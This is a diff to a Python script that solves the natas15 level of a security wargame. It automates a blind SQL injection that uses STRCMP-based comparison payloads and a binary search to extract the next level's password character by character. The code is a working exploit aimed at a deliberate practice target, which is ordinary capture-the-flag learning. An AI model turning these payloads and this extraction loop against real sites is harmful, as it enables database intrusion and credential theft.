@@ -4,6 +4,8 @@ natas15: "blind" SQL injection
 
 import asyncio
 import aiohttp
+import string
+from time import sleep
 from typing import NewType, Optional, Union
 
 from natas_utils import *
@@ -20,23 +22,48 @@ LT = Less(-1)
 EQ = Equal(0)
 GT = Greater(1)
 
-def solve(url: str, login: LevelLogin) -> Optional[str]:
-    return asyncio.run(solve_async(url, login))
+CHARS = string.digits + string.ascii_uppercase + string.ascii_lowercase
 
-async def solve_async(url: str, login: LevelLogin) -> Optional[str]:
+def solve(url: str, login: LevelLogin) -> Optional[str]:
+    candidate = asyncio.run(solve_async(url, login))
+    return try_level_login(LEVEL + 1, [candidate])
+
+async def solve_async(url: str, login: LevelLogin) -> str:
     # need to extract user natas16's password
-    user = "natas16"
+    username = "natas16"
 
     async with aiohttp.ClientSession(auth=aiohttp.BasicAuth(*login)) as session:
         response = await session.post(url, data={"username": "natas16"})
 
-        print(await query_comparison(session, url, user, "0"))
-        print(await query_comparison(session, url, user, "z"))
+        flag = await binary_search_password(session, url, username)
 
-    return None
+    return flag
 
-async def binary_search(session: aiohttp.ClientSession, url: str):
-    pass
+async def binary_search_password(session: aiohttp.ClientSession, url: str, username: str):
+    match_found = False
+    password = ""
+    for _ in range(64):
+        # search bounds
+        low = 0
+        high = len(CHARS) - 1
+
+        while low < high - 1:
+            # midpoint to check
+            mid = low + (high - low) // 2
+
+            res = await query_comparison(session, url, username, password + CHARS[mid])
+
+            if res is LT:
+                low = mid
+            elif res is GT:
+                high = mid
+            elif res is EQ:
+                return password + CHARS[mid]
+
+        password += CHARS[low]
+        # print(len(password), password)
+
+    return password
 
 async def query_comparison(session: aiohttp.ClientSession, url: str, username: str, password: str) -> Union[Less, Equal, Greater]:
     """
@@ -46,16 +73,17 @@ async def query_comparison(session: aiohttp.ClientSession, url: str, username: s
     # relevant source line:
     # `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`
     greater = {
-        "username": f'{username}" AND STRCMP("{password}",password)=1 #'
+        "username": f'{username}" and strcmp(binary "{password}", binary password)=1 #'
     }
     equal = {
-        "username": f'{username}" AND STRCMP("{password}",password)=0 #'
+        "username": f'{username}" and strcmp(binary "{password}", binary password)=0 #'
     }
 
     response_greater = query(session, url, greater)
     response_equal = query(session, url, equal)
 
-    gt, eq = tuple(await asyncio.gather(response_greater, response_equal))
+    gt, eq = await asyncio.gather(response_greater, response_equal)
+    # print(f"{gt} {eq} {password[-1]}")
 
     if gt:
         return GT
@@ -67,6 +95,7 @@ async def query_comparison(session: aiohttp.ClientSession, url: str, username: s
 async def query(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
     response = await session.post(url, data=data)
     text = await response.text()
+    # print(text)
     return QUERY_SUCCESS_INDICATOR in text
 
 if __name__ == "__main__":
